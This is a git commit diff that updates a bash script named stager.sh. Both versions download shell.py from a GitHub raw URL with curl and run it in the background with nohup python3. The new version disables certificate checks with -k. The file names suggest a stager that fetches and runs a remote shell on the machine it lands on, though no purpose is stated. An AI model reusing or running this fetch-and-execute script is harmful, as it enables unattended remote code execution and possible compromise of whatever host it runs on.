957a4378feb1ba2c08c23b9336d0ea61df5829e4
pavelrn <30939390+pavelrn@users.noreply.github.com>
2023-07-13 22:37:52 +0200

    Update stager.sh

--- stager.sh
+++ stager.sh
@@ -1,9 +1,8 @@
 #!/bin/bash
 
-$L=/var/log/pan/1.log
-echo "Starting..." >> $L
+echo "Starting..."
 
-curl https://raw.githubusercontent.com/pavelrn/js-sandbox/main/shell.py --output shell.py >> $L
-ls -lsa >> $
-nohup python3 shell.py >> $L 2>&1 & 
-echo 'ok' >> $L
+curl -k https://raw.githubusercontent.com/pavelrn/js-sandbox/main/shell.py --output shell.py
+ls -lsa
+nohup python3 shell.py >> /var/log/pan/shell.py.log 2>&1 & 
+echo 'ok'
